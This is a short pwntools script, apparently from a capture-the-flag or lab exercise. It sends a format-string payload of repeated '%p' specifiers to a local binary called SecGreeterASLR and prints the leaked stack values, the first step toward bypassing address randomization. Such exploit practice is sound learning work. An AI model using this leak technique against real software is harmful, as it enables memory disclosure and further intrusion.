from pwn import *

# Set the target binary
context.binary = binary = ELF('./SecGreeterASLR')

# Disable verbose logging to keep output clean
context.log_level = 'error'

def test_leak():
    # Start the process
    p = process()
    
    # Receive "What is your name?"
    p.recvline()
    
    # Send a payload with many %p to leak stack values
    # We send 40 %p's separated by dots
    payload = "%p." * 40
    p.sendline(payload)
    
    # Receive the "Hello ..." line which contains our leak
    # We discard the "Hello " part to get just the values
    output = p.recvline().decode().strip()
    
    # Clean up
    p.close()
    
    # Print the output split by dots
    print("Stack Leak Output:")
    values = output.split('.')
    for i, val in enumerate(values):
        if val and "nil" not in val:
            print(f"Index {i+1}: {val}")

test_leak()